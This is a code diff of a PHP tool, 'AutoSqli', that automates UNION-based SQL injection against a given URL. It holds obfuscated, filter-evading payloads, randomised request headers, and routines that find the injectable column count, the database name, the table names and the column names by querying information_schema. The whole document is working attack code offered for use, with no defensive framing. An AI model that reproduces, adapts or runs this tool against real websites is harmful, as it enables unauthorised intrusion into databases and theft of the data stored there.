@@ -1,28 +1,33 @@
 <?php
 
+use Spatie\Regex\Regex;
+use JMathai\PhpMultiCurl\MultiCurl;
+
 require "autoload.php";
 error_reporting(0);
 
 class AutoSqli
 {
+    public static $url                 = "";
+    public static $url_injection       = "";
+    public static $database            = "";
+    public static $table               = "";
+    public static $columns             = array();
+    public static $url_payload_ncolum  = "";
 
-    public $url                 = "";
-    public $url_injection       = "";
-    public $current_database    = "";
-    public $databases           = [];
-    public $tabels              = [];
-    public $columns             = [];
-    public $startSQLi           = "0x3C73716C692D68656C7065723E"; # <sqli-helper>
-    public $endSQLi             = "0x3C2F73716C692D68656C7065723E"; # </sqli-helper>
-    public $UnionPayload        = "/**666**/%41%4e%44/**666**/0/**666**//*!13337%55%6e%49o%4E*//**666**//*!13337s%45l%45c%54*//**666**/";
-    public $number_colum        = 0;
-    public $header              = [];
-    public $options_curl        = [];
+    public static $getColPayload       = "/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/";
+    public static $startSQLi           = "0x3C73716C692D68656C7065723E"; # <sqli-helper>
+    public static $endSQLi             = "0x3C2F73716C692D68656C7065723E"; # </sqli-helper>
+    public static $UnionPayload        = "/**666**/%41%4e%44/**666**/0/**666**//*!13337%55%6e%49o%4E*//**666**//*!13337s%45l%45c%54*//**666**/";
+    public static $number_colum        = 0;
+    public static $vulncolum           = 0;
+    public static $maxColumns          = 100;
 
-    public function __construct()
+    private static function getContent($url, $code = "")
     {
-        // set header
-        $this->header = array(
+        $mc = MultiCurl::getInstance();
+
+        $header = array(
             'Connection: keep-alive',
             'Keep-Alive: ' . rand(110, 120),
             'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
@@ -33,123 +38,163 @@ class AutoSqli
             'Pragma: no-cache',
         );
 
-        // set URL and other appropriate options
-        $this->options_curl  = array(
+        $array_curl = array(
+            CURLOPT_URL => $url,
             CURLOPT_RETURNTRANSFER => TRUE,
             CURLOPT_SSL_VERIFYPEER => FALSE,
             CURLOPT_SSL_VERIFYHOST => FALSE,
             CURLOPT_TIMEOUT => 5,
             CURLOPT_CONNECTTIMEOUT => 5,
             CURLOPT_ENCODING => 'gzip',
-            // CURLOPT_PROXY => Proxy::random(),
-            // CURLOPT_PROXYPORT => $proxy->port,
+            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
             CURLOPT_USERAGENT => UAgent::random(),
             CURLOPT_REFERER => Referer::random(),
-            CURLOPT_HTTPHEADER => $this->header,
+            CURLOPT_HTTPHEADER => $header
         );
+
+        if (!$ch = curl_init());
+        curl_setopt_array($ch, $array_curl);
+
+        $call = $mc->addCurl($ch);
+
+        if ($code != "") {
+            return $call->code;
+        } else {
+            return $call->response;
+        }
     }
 
-    // public function grabproxy()
-    // {
-    //     ProxyGrabber::getproxy();
-    // }
-
-    public function setUrl($url)
+    private static function strchar($string)
     {
-        $this->url = $url;
+        $char = "";
+        $pisah = str_split($string);
+        foreach ($pisah as $value) {
+            $char .= ord($value) . ", ";
+        }
+
+        $char = str_replace(' ', '', $char);
+        return rtrim($char, ",");
     }
 
-    public function getUrl()
-    {
-        return $this->url . rand(10, 100);
-    }
-
-    public function strhex($string)
+    private static function strhex($string)
     {
         $hexstr = unpack('H*', $string);
         return array_shift($hexstr);
     }
 
-    public function findnumbercolumn()
+    private static function getConcat($string)
     {
-        $mc = JMathai\PhpMultiCurl\MultiCurl::getInstance();
-        $tampung_semua = array();
-        $this->url_injection = "{$this->url}-" . rand(10, 100);
-
-        $tampung_angka = "";
-
-        for ($i = 1; $i <= 100; $i++) {
-            $tampung_angka .= "/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/" . ",";
-
-            $full_url = "{$this->url_injection}{$this->UnionPayload}" . rtrim($tampung_angka, ",") . "+--+-";
-            $full_url1 = "{$this->url_injection}'{$this->UnionPayload}" . rtrim($tampung_angka, ",") . "+--+-";
-
-            array_push($tampung_semua, $full_url);
-            array_push($tampung_semua, $full_url1);
-        }
-
-        foreach ($tampung_semua as $link_exp) {
-            if (!$ch = curl_init($link_exp));
-            curl_setopt_array($ch, $this->options_curl);
-            $respones = $mc->addCurl($ch);
-
-            $resut = $respones->response;
-
-            preg_match("/sqli indosec/si", strip_tags($resut), $match,  PREG_OFFSET_CAPTURE, 0);
-
-            if ($match[0][0] == "") {
-                $this->number_colum += 1;
-            }
-
-            if ($match[0][0] != "") {
-                break 1;
-            }
-        }
+        return "/*!50000Concat(0x" . self::strhex('<concat>') . ",/*!50000gROup_cONcat(" . $string . ")*/,0x" . self::strhex('</concat>') . ")";
     }
 
-    public function getnumbercolumn()
-    {
-        if ($this->number_colum == 200) {
-            return false;
-        }
 
-        $this->number_colum = (int) ($this->number_colum / 2) + 1;
-        return  $this->number_colum;
+    public static function setUrl($url)
+    {
+        $code = self::getContent($url, "yes");
+
+        if ($code != 200) die("you are not connected to the internet or you internet slowy or website down \n");
+        self::$url = $url;
     }
 
-    public function findcurrentdatabase()
+    public static function getUrl()
     {
-        $mc = JMathai\PhpMultiCurl\MultiCurl::getInstance();
-        $tampung_semua = array();
+        return self::$url . rand(10, 100);
+    }
+
+    public static function setNumColumns()
+    {
+        echo "[!] Start Count Columns...\n";
+        self::$url_injection = self::$url . "-" . rand(10, 100);
         $tampung_angka = "";
 
-        for ($i = 1; $i <= $this->number_colum; $i++) {
-            $tampung_angka .= "/*!50000%43o%4Ec%41t/**12345**/({$this->startSQLi},/*!12345%44a%54a%42a%53e*/(),{$this->endSQLi})" . ",";
+        for ($i = 1; $i <= self::$maxColumns; $i++) {
+            $tampung_angka .= self::$getColPayload . ",";
 
-            $full_url = "{$this->url_injection}{$this->UnionPayload}" . rtrim($tampung_angka, ",") . "+--+-";
-            $full_url1 = "{$this->url_injection}'{$this->UnionPayload}" . rtrim($tampung_angka, ",") . "+--+-";
+            $full_url = self::$url_injection . self::$UnionPayload . rtrim($tampung_angka, ",") . "+--+-";
+            $full_url1 = self::$url_injection . "'" . self::$UnionPayload . rtrim($tampung_angka, ",") . "+--+-";
 
-            array_push($tampung_semua, $full_url);
-            array_push($tampung_semua, $full_url1);
-        }
+            $content = self::getContent($full_url);
+            $content1 = self::getContent($full_url1);
 
-        foreach ($tampung_semua as $link_exp) {
-            if (!$ch = curl_init($link_exp));
-            curl_setopt_array($ch, $this->options_curl);
-            $respones = $mc->addCurl($ch);
+            if (Regex::match('/sqli indosec/', $content)->hasMatch()) {
+                echo "[+] Columns Total: $i \n";
+                self::$number_colum = $i;
+                self::$url_payload_ncolum = $full_url;
+                break;
+            }
 
-            $resut = $respones->response;
-            preg_match('/<sqli-helper>(.*?)<\/sqli-helper>/si', $resut, $match,  PREG_OFFSET_CAPTURE, 0);
-
-            if ($match[1][0] != "") {
-                $this->current_database = $match[1][0];
+            if (Regex::match('/sqli indosec/', $content1)->hasMatch()) {
+                echo "[+] Columns Total: $i \n";
+                self::$number_colum = $i;
+                self::$url_payload_ncolum = $full_url1;
                 break;
             }
         }
     }
 
-    public function getcurrentdatabase()
+    public static function getUrlPayload()
     {
-        return $this->current_database;
+        return self::$url_payload_ncolum;
+    }
+
+    public static function setDatabase()
+    {
+        $getDatabase = str_replace('/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/', "/*!50000%43o%4Ec%41t/**12345**/(" . self::$startSQLi . ",/*!12345%44a%54a%42a%53e*/()," . self::$endSQLi . ")", self::$url_payload_ncolum);
+        $content = self::getContent($getDatabase);
+        self::$database = Regex::match('/<sqli-helper>(.*?)<\/sqli-helper>/', $content)->result();
+    }
+
+    public static function getDatabase()
+    {
+        self::$database = str_replace('<sqli-helper>', '', self::$database);
+        self::$database = str_replace('</sqli-helper>', '', self::$database);
+
+        return self::$database;
+    }
+
+    public static function setTable()
+    {
+        $getTable = str_replace('/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/', self::getConcat("table_name"), self::$url_payload_ncolum);
+        $getTable = str_replace("+--+-", "+from+/*!50000inforMAtion_schema*/.tables+/*!50000wHEre*/+/*!50000taBLe_scheMA*/like+database()+--+-", $getTable);
+        $content = self::getContent($getTable);
+        self::$table = Regex::match('/<concat>(.*?)<\/concat>/', $content)->result();
+    }
+
+    public static function getTable()
+    {
+        self::$table = str_replace('<concat>', '', self::$table);
+        self::$table = str_replace('</concat>', '', self::$table);
+
+        return self::$table;
+    }
+
+    public static function setColumns()
+    {
+        $tables = explode(",", self::$table);
+        $columns_data = [];
+
+        foreach ($tables as $value) {
+            $getColumns = str_replace('/*!50000%43o%4Ec%41t/**12345**/(0x73716c6920696e646f736563)*/', self::getConcat("column_name"), self::$url_payload_ncolum);
+            $getColumns = str_replace("+--+-", "+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(" . self::strchar($value) . ")+--+-", $getColumns);
+
+            $content = self::getContent($getColumns);
+
+            array_push($columns_data, (object) [
+                $value => Regex::match('/<concat>(.*?)<\/concat>/', $content)->result()
+            ]);
+        }
+
+        self::$columns = $columns_data;
+    }
+
+    public static function getColumns()
+    {
+        foreach (self::$columns as $key => $value) {
+            foreach ($value as $key1 => $value1) {
+                $value1 = str_replace('<concat>', '', $value1);
+                $value1 = str_replace('</concat>', '', $value1);
+                echo "Table $key1 => " . $value1 . "\n";
+            }
+        }
     }
 }
